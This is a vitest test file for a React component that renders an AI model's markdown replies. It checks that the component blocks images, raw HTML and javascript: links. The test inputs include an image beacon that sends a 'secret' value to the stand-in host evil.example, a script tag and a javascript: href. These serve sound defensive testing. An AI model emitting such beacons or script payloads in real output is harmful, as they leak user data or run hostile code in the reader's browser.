// Defense-in-depth checks on the renderer itself. The API sanitizes first;
// these prove the client refuses the same attack classes independently.

import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { AssistantMarkdown } from "./AssistantMarkdown";

const render = (content: string) => renderToStaticMarkup(<AssistantMarkdown content={content} />);

describe("AssistantMarkdown", () => {
  it("renders links with a hardened rel and no same-tab navigation", () => {
    const html = render("[portal](https://sso.example/reset)");
    expect(html).toContain('href="https://sso.example/reset"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it("never renders images, even if one survived the API", () => {
    const html = render("![pixel](https://evil.example/beacon?d=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("never parses raw HTML", () => {
    const html = render('<script>alert(1)</script><img src="https://evil.example/x">');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
  });

  it("drops javascript: hrefs", () => {
    const html = render("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("renders ordinary formatting", () => {
    const html = render("**bold** and a list:\n\n- one\n- two");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<li>one</li>");
  });
});
